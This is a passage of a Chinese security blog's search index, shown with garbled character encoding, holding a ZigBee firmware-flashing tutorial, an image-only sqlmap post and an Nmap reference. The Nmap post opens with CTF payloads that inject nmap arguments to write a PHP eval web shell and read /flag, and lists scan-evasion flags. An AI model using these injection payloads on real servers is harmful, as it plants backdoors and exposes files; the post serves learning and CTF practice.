ï¼šn4br</p><p>ç‚¹å‡»å®‰è£…å³å¯ï¼Œå®‰è£…å®Œæˆåæ¡Œé¢ä¼šå‡ºç°ä»¥ä¸‹å›¾æ ‡ï¼Œç‚¹å‡»å³å¯æ‰“å¼€åº”ç”¨</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee%E5%85%A5%E9%97%A8/MDvHk5m8SolWeKB.png" alt loading="lazy"></p><p>å¦å¤–éœ€è¦åœ¨IARä¸­å¯¼å‡ºåç¼€ä¸º.Hexçš„æ–‡ä»¶</p><p>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ä½ æƒ³å‘½åçš„.Hexæ–‡ä»¶ï¼ˆæ³¨ï¼šæ ¼å¼ä¸ºæ–‡ä»¶å+.hexï¼‰</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/8jDiUsRfWE7ZKbQ.png" loading="lazy"><p>å¦å¤–åœ¨Output formatå¤„é€‰æ‹©intel-extendedï¼ŒOKå³å¯</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/bkgJFvfWYCnoROD.png" loading="lazy"><p>éšåç¼–è¯‘ï¼Œå¯çœ‹è§åœ¨æ­¤ç›®å½•ä¸‹å¤šäº†ä¸€ä¸ªa.hexçš„æ–‡ä»¶</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/lfVyDi1gH8e2TrB.png" loading="lazy"><p>åœ¨ SmartRF flash programmer è½¯ä»¶çš„flash imageä¸­é€‰æ‹©åˆ°æ­¤æ–‡ä»¶ï¼Œç‚¹å‡»perform actionï¼Œå³å¯å°†æ–‡ä»¶çƒ§åˆ°æ¿å­é‡Œé¢å»</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBeeå…¥é—¨/F2XMEWZfcy7vSJQ.png" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmapä½¿ç”¨</title>
      <link href="posts/c06d8347/"/>
      <url>posts/c06d8347/</url>
      
        <content type="html"><![CDATA[<p>ä»¥ä¸‹å›¾æ¥è‡ªXBXç™½ç»†èƒå®‰å…¨å›¢é˜Ÿï¼ˆLEUKOCYTEï¼‰ï¼ˆä¾µåˆ ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113716744.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113746488.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113842327.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113914099.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113941052.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114009522.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114036397.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114108504.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114130551.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114151354.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114225256.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114248814.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114310504.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114329273.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114403009.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114427824.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114451429.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114513110.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114537281.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114559948.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114635757.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmapçš„åŸºç¡€ä½¿ç”¨</title>
      <link href="posts/e1005ac/"/>
      <url>posts/e1005ac/</url>
      
        <content type="html"><![CDATA[<p>ä¸€äº›å…³äºnmapå‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®payload</p><p><code>&#39; -oN b.phtml &lt;?=eval($_POST[a]);?&gt;&#39;</code></p><p><code>&#39; -iL /flag -oN flag.txt &#39;</code></p><p><code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p><p>nmapè¿™ä¸ªæ¸—é€å·¥å…·ä¸€èˆ¬æœ‰åœ¨æ¸—é€çš„å‡†å¤‡é˜¶æ®µï¼Œç”¨äºæ”¶é›†ç”¨æˆ·çš„ä¿¡æ¯ï¼Œä¸ºåé¢çš„æ¸—é€åšæƒ…æŠ¥æ”¯æŒ</p><p>Nmapæ˜¯ä¸»æœºæ‰«æå·¥å…·ï¼Œä»–çš„å›¾å½¢åŒ–ç•Œé¢æ˜¯Zenmapï¼Œåˆ†å¸ƒå¼æ¡†æ¶ä¸ºDnmapã€‚</p><p>Nmapå¯ä»¥å®Œæˆä»¥ä¸‹ä»»åŠ¡ï¼š</p><ul><li>ä¸»æœºæ¢æµ‹</li><li>ç«¯å£æ‰«æ</li><li>ç‰ˆæœ¬æ£€æµ‹</li><li>ç³»ç»Ÿæ£€æµ‹</li><li>æ”¯æŒæ¢æµ‹è„šæœ¬çš„ç¼–å†™</li></ul><span id="more"></span><p>Nmapåœ¨å®é™…ä¸­åº”ç”¨åœºåˆå¦‚ä¸‹ï¼š</p><ul><li>é€šè¿‡å¯¹è®¾å¤‡æˆ–è€…é˜²ç«å¢™çš„æ¢æµ‹æ¥å®¡è®¡å®ƒçš„å®‰å…¨æ€§</li><li>æ¢æµ‹ç›®æ ‡ä¸»æœºæ‰€å¼€æ”¾çš„ç«¯å£</li><li>é€šè¿‡è¯†åˆ«æ–°çš„æœåŠ¡å™¨å®¡è®¡ç½‘ç»œçš„å®‰å…¨æ€§</li><li>æ¢æµ‹ç½‘ç»œä¸Šçš„ä¸»æœº</li></ul><p>å¸¸è§æœåŠ¡å¯¹åº”ç«¯å£å·ï¼š</p><table><thead><tr><th align="center"><strong>æœåŠ¡</strong></th><th align="center"><strong>ç«¯å£å·</strong></th></tr></thead><tbody><tr><td align="center">HTTP</td><td align="center">80</td></tr><tr><td align="center">HTTPS</td><td align="center">443</td></tr><tr><td align="center">Telnetï¼ˆè¿œç¨‹ç™»å½•ï¼‰</td><td align="center">23</td></tr><tr><td align="center">SSHï¼ˆå®‰å…¨ç™»å½•ï¼‰ï¼ŒSCPï¼ˆæ–‡ä»¶ä¼ è¾“ï¼‰ï¼Œç«¯å£é‡å®šå‘</td><td align="center">22</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/SMTP/175887?fr=aladdin">SMTP</a>ï¼ˆç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼‰</td><td align="center">25</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/POP3/175122?fr=aladdin">POP3</a>ï¼ˆ é‚®å±€åè®®ç‰ˆæœ¬3 ï¼‰</td><td align="center">110</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/weblogic/451978?fr=aladdin">WebLogic</a></td><td align="center">7001</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/tomcat/255751?fr=aladdin">TOMCAT</a>ï¼ˆ Java WebæœåŠ¡å™¨ ï¼‰</td><td align="center">8080</td></tr><tr><td align="center">WIN2003è¿œç¨‹ç™»å½•</td><td align="center">3389</td></tr><tr><td align="center">Oracleæ•°æ®åº“</td><td align="center">1521</td></tr><tr><td align="center">MY SQL SERVERæ•°æ®åº“</td><td align="center">1433</td></tr><tr><td align="center">MySQLæ•°æ®åº“</td><td align="center">3306</td></tr></tbody></table><p>åœ¨kaliä¸­ä½¿ç”¨ï¼šå‘½ä»¤è¡Œnmapå³å¯ä½¿ç”¨</p><p>nmap -versionå³å¯æŸ¥çœ‹nmapçš„ç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-27.png" alt loading="lazy"></p><p>æ‰«æç®€å•æ¥è¯´å°±æ˜¯å››ä¸ªåŠ¨ä½œ</p><ul><li>ç»Ÿä¸€æ²Ÿé€šè¯­è¨€ï¼ˆTCP/IPåè®®ï¼‰</li><li>å‘å‡ºåˆºæ¿€ï¼ˆICMPæŠ¥æ–‡å¤´ï¼‰</li><li>å—åˆ°åˆºæ¿€çš„åé¦ˆï¼ˆICMPçš„åé¦ˆï¼‰</li><li>é€šè¿‡æ¯”å¯¹åˆºæ¿€å’Œåé¦ˆå®Œæˆæ‰«æ</li></ul><p>è¯´å®è¯è¿™å››ä¸ªåŠ¨ä½œå…·ä½“æ˜¯å•¥æ„æ€æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ˜ç™½</p><p>å°†ä½ è¦æ‰«æçš„è®¾å¤‡åœ°å€å‘Šè¯‰nmapå¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•å®ç°ç»Ÿä¸€çš„æ ¼å¼</p><ul><li>namp [æ‰«æç±»å‹] [è®¾ç½®] {è®¾å¤‡åœ°å€}</li></ul><p><strong>nmapå¸¸ç”¨çš„å‚æ•°åŠæ„ä¹‰</strong></p><ol><li>-A ï¼šé€‰æ‹©ç”¨äºä½¿ç”¨è¿›æ”»æ€§æ–¹å¼æ‰«æï¼›å…¨é¢ç³»ç»Ÿæ£€æµ‹ï¼Œå¯ç”¨è„šæœ¬æ£€æµ‹ï¼Œæ‰«æã€‚ï¼ˆæ¨èï¼‰</li><li>-T4ï¼šæŒ‡å®šæ‰«æè¿‡ç¨‹ä½¿ç”¨çš„æ—¶åºï¼Œè¡¨ç¤ºç¦æ­¢åŠ¨æ€æ‰«æå»¶æ—¶è¶…è¿‡çš„æ—¶é—´ï¼›æ€»å…±æœ‰6ä¸ªçº§åˆ«ï¼ˆ0-5ï¼‰ã€‚çº§åˆ«è¶Šé«˜ï¼Œæ‰«æé€Ÿåº¦è¶Šå¿«ï¼Œä½†ä¹Ÿå®¹æ˜“è¢«é˜²ç«å¢™æˆ–IDSæ£€æµ‹å¹¶å±è”½æ‰ï¼Œåœ¨ç½‘ç»œé€šè®¯çŠ¶å†µè¾ƒå¥½çš„æƒ…å†µä¸‹æ¨èä½¿ç”¨T4 ã€‚*ï¼ˆ å‡å¦‚é˜²ç«å¢™æ˜¯ä¸€å¹¢å¤§æ¥¼çš„é—¨é”ï¼Œé‚£ä¹ˆIDSå°±æ˜¯è¿™å¹¢å¤§æ¥¼é‡Œçš„ç›‘è§†ç³»ç»Ÿã€‚ä¸€æ—¦å°å·çˆ¬çª—è¿›å…¥å¤§æ¥¼ï¼Œæˆ–å†…éƒ¨äººå‘˜æœ‰è¶Šç•Œè¡Œä¸ºï¼Œåªæœ‰å®æ—¶ç›‘è§†ç³»ç»Ÿæ‰èƒ½å‘ç°æƒ…å†µå¹¶å‘å‡ºè­¦å‘Šã€‚ ï¼‰ï¼ˆæ¨èï¼‰</li><li>-oX test.xmlï¼šå°†æ‰«æç»“æœç”Ÿæˆtest.xmlæ–‡ä»¶</li><li>-oG test.txtï¼šå°†æ‰«æç»“æœç”Ÿæˆtest.txtæ–‡ä»¶</li><li>-snï¼šåªè¿›è¡Œä¸»æœºå‘ç°ï¼Œä¸è¿›è¡Œç«¯å£æ‰«æ</li><li>-Oï¼šæŒ‡å®šNmapè¿›è¡Œç³»ç»Ÿç‰ˆæœ¬æ‰«æ</li><li>-sVï¼šæŒ‡å®šNmapè¿›è¡ŒæœåŠ¡ç‰ˆæœ¬æ‰«æ</li><li>-p <code>&lt;port ranges&gt;</code>ï¼šæ‰«ææŒ‡å®šçš„ç«¯å£</li><li>-sS/sT/sA/sW/sMï¼šæŒ‡å®šä½¿ç”¨ TCP SYN/Connect()/ACK/Window/Maimon scansçš„æ–¹å¼æ¥å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æ</li><li>-sU: æŒ‡å®šä½¿ç”¨UDPæ‰«ææ–¹å¼ç¡®å®šç›®æ ‡ä¸»æœºçš„UDPç«¯å£çŠ¶å†µ</li><li>-script  <code>&lt;script name&gt;</code> : æŒ‡å®šæ‰«æè„šæœ¬</li><li>-Pn ï¼š ä¸è¿›è¡Œpingæ‰«æï¼ˆæ¨èï¼‰</li><li>-sP : ç”¨pingæ‰«æåˆ¤æ–­ä¸»æœºæ˜¯å¦å­˜æ´»ï¼Œåªæœ‰ä¸»æœºå­˜æ´»ï¼Œnmapæ‰ä¼šç»§ç»­æ‰«æï¼Œä¸€èˆ¬æœ€å¥½ä¸åŠ ï¼Œå› ä¸ºæœ‰çš„ä¸»æœºä¼šç¦æ­¢ping</li><li>-PI : è®¾ç½®è¿™ä¸ªé€‰é¡¹ï¼Œè®©nmapä½¿ç”¨çœŸæ­£çš„ping(ICMP echoè¯·æ±‚)æ¥æ‰«æç›®æ ‡ä¸»æœºæ˜¯å¦æ­£åœ¨è¿è¡Œã€‚</li><li>-iL 1.txt : æ‰¹é‡æ‰«æ1.txtä¸­çš„ç›®æ ‡åœ°å€</li><li>-sL: List Scan åˆ—è¡¨æ‰«æï¼Œä»…å°†æŒ‡å®šçš„ç›®æ ‡çš„IPåˆ—ä¸¾å‡ºæ¥ï¼Œä¸è¿›è¡Œä¸»æœºå‘ç°</li><li>-sY/sZ: ä½¿ç”¨SCTP INIT/COOKIE-ECHOæ¥æ‰«æSCTPåè®®ç«¯å£çš„å¼€æ”¾çš„æƒ…å†µ</li><li>-sO: ä½¿ç”¨IP protocol æ‰«æç¡®å®šç›®æ ‡æœºæ”¯æŒçš„åè®®ç±»å‹</li><li>-PO : ä½¿ç”¨IPåè®®åŒ…æ¢æµ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦å¼€å¯</li><li>-PE/PP/PM : ä½¿ç”¨ICMP echoã€ ICMP timestampã€ICMP netmask è¯·æ±‚åŒ…å‘ç°ä¸»æœº</li><li>-PS/PA/PU/PY : ä½¿ç”¨TCP SYN/TCP ACKæˆ–SCTP INIT/ECHOæ–¹å¼è¿›è¡Œå‘ç°</li><li>-sN/sF/sX: æŒ‡å®šä½¿ç”¨TCP Null, FIN, and Xmas scansç§˜å¯†æ‰«ææ–¹å¼æ¥ååŠ©æ¢æµ‹å¯¹æ–¹çš„TCPç«¯å£çŠ¶æ€</li><li>-e eth0ï¼šæŒ‡å®šä½¿ç”¨eth0ç½‘å¡è¿›è¡Œæ¢æµ‹</li><li>-f : â€“mtu <code>&lt;val&gt;</code>: æŒ‡å®šä½¿ç”¨åˆ†ç‰‡ã€æŒ‡å®šæ•°æ®åŒ…çš„ MTU.</li><li>-b <code>&lt;FTP relay host&gt;</code>: ä½¿ç”¨FTP bounce scanæ‰«ææ–¹å¼</li><li>-gï¼š æŒ‡å®šå‘é€çš„ç«¯å£å·</li><li>-rï¼šä¸è¿›è¡Œç«¯å£éšæœºæ‰“ä¹±çš„æ“ä½œï¼ˆå¦‚æ— è¯¥å‚æ•°ï¼Œnmapä¼šå°†è¦æ‰«æçš„ç«¯å£ä»¥éšæœºé¡ºåºæ–¹å¼æ‰«æï¼Œä»¥è®©nmapçš„æ‰«æä¸æ˜“è¢«å¯¹æ–¹é˜²ç«å¢™æ£€æµ‹åˆ°ï¼‰</li><li>-v ï¼šè¡¨ç¤ºæ˜¾ç¤ºå†—ä½™ä¿¡æ¯ï¼Œåœ¨æ‰«æè¿‡ç¨‹ä¸­æ˜¾ç¤ºæ‰«æçš„ç»†èŠ‚ï¼Œä»è€Œè®©ç”¨æˆ·äº†è§£å½“å‰çš„æ‰«æçŠ¶æ€ï¼ˆæ¨èï¼‰</li><li>-n : è¡¨ç¤ºä¸è¿›è¡ŒDNSè§£æï¼›</li><li>-D &lt;decoy1,decoy2[,ME],â€¦&gt;: ç”¨ä¸€ç»„ IP åœ°å€æ©ç›–çœŸå®åœ°å€ï¼Œå…¶ä¸­ ME å¡«å…¥è‡ªå·±çš„ IP åœ°å€</li><li>-R ï¼šè¡¨ç¤ºæ€»æ˜¯è¿›è¡ŒDNSè§£æã€‚</li><li>-F : å¿«é€Ÿæ¨¡å¼ï¼Œä»…æ‰«æTOP 100çš„ç«¯å£</li><li>-S <IP_Address>: ä¼ªè£…æˆå…¶ä»– IP åœ°å€</IP_Address></li><li>â€“ttl <code>&lt;val&gt;</code>: è®¾ç½® time-to-live æ—¶é—´</li><li>â€“badsum: ä½¿ç”¨é”™è¯¯çš„ checksum æ¥å‘é€æ•°æ®åŒ…ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥ç±»æ•°æ®åŒ…è¢«æŠ›å¼ƒï¼Œå¦‚æœæ”¶åˆ°å›å¤ï¼Œè¯´æ˜å›å¤æ¥è‡ªé˜²ç«å¢™æˆ– IDS/IPSï¼‰</li><li>â€“dns-servers : æŒ‡å®šDNSæœåŠ¡å™¨</li><li>â€“system-dns : æŒ‡å®šä½¿ç”¨ç³»ç»Ÿçš„DNSæœåŠ¡å™¨</li><li>â€“traceroute : è¿½è¸ªæ¯ä¸ªè·¯ç”±èŠ‚ç‚¹</li><li>â€“scanflags <code>&lt;flags&gt;</code>: å®šåˆ¶TCPåŒ…çš„flags</li><li>â€“top-ports <code>&lt;number&gt;</code> :æ‰«æå¼€æ”¾æ¦‚ç‡æœ€é«˜çš„numberä¸ªç«¯å£</li><li>â€“port-ratio <code>&lt;ratio&gt;</code>: æ‰«ææŒ‡å®šé¢‘ç‡ä»¥ä¸Šçš„ç«¯å£ã€‚ä¸ä¸Šè¿°â€“top-portsç±»ä¼¼ï¼Œè¿™é‡Œä»¥æ¦‚ç‡ä½œä¸ºå‚æ•°</li><li>â€“version-trace: æ˜¾ç¤ºå‡ºè¯¦ç»†çš„ç‰ˆæœ¬ä¾¦æµ‹è¿‡ç¨‹ä¿¡æ¯</li><li>â€“osscan-limit: é™åˆ¶Nmapåªå¯¹ç¡®å®šçš„ä¸»æœºçš„è¿›è¡ŒOSæ¢æµ‹ï¼ˆè‡³å°‘éœ€ç¡®çŸ¥è¯¥ä¸»æœºåˆ†åˆ«æœ‰ä¸€ä¸ªopenå’Œclosedçš„ç«¯å£ï¼‰</li><li>â€“osscan-guess: å¤§èƒ†çŒœæµ‹å¯¹æ–¹çš„ä¸»æœºçš„ç³»ç»Ÿç±»å‹ã€‚ç”±æ­¤å‡†ç¡®æ€§ä¼šä¸‹é™ä¸å°‘ï¼Œä½†ä¼šå°½å¯èƒ½å¤šä¸ºç”¨æˆ·æä¾›æ½œåœ¨çš„æ“ä½œç³»ç»Ÿ</li><li>â€“data-length <code>&lt;num&gt;</code>: å¡«å……éšæœºæ•°æ®è®©æ•°æ®åŒ…é•¿åº¦è¾¾åˆ° Num</li><li>â€“ip-options <code>&lt;options&gt;</code>: ä½¿ç”¨æŒ‡å®šçš„ IP é€‰é¡¹æ¥å‘é€æ•°æ®åŒ…</li><li>â€“spoof-mac &lt;mac address/prefix/vendor name&gt; : ä¼ªè£… MAC åœ°å€</li><li>â€“version-intensity <code>&lt;level&gt;</code>: æŒ‡å®šç‰ˆæœ¬ä¾¦æµ‹å¼ºåº¦ï¼ˆ0-9ï¼‰ï¼Œé»˜è®¤ä¸º7ã€‚æ•°å€¼è¶Šé«˜ï¼Œæ¢æµ‹å‡ºçš„æœåŠ¡è¶Šå‡†ç¡®ï¼Œä½†æ˜¯è¿è¡Œæ—¶é—´ä¼šæ¯”è¾ƒé•¿ã€‚</li><li>â€“version-light: æŒ‡å®šä½¿ç”¨è½»é‡ä¾¦æµ‹æ–¹å¼ (intensity 2)</li><li>â€“version-all: å°è¯•ä½¿ç”¨æ‰€æœ‰çš„probesè¿›è¡Œä¾¦æµ‹ (intensity 9)</li></ol><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-28.png" alt loading="lazy"></p><p>å‚è€ƒåŸæ–‡é“¾æ¥ï¼š<a href="https://www.cnblogs.com/bonelee/p/9188122.html">1</a>ï¼Œ<a href="https://www.cnblogs.com/liaopeng123/p/11281516.html">2</a></p>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My_Blog&#39;s Birthday</title>
      <link href="posts/37e5e453/"/>
      <url>posts/37e5e453/</url>
      
        <content type="html"><![CDATA[<p><strong>çºªå¿µè¯è¾°</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/My_Blog's%20Birthday/To-Small-1576157953127.jpg" alt loading="lazy"></p><p>â€‹                                                                                                                                       â€”â€”â€”â€”<strong>2020-1-8</strong></p><span id="more"></span>]]></content>
      
      
      <categories>
          
          <category> æ‚ä¸ƒæ‚å…« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç”Ÿæ´» </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
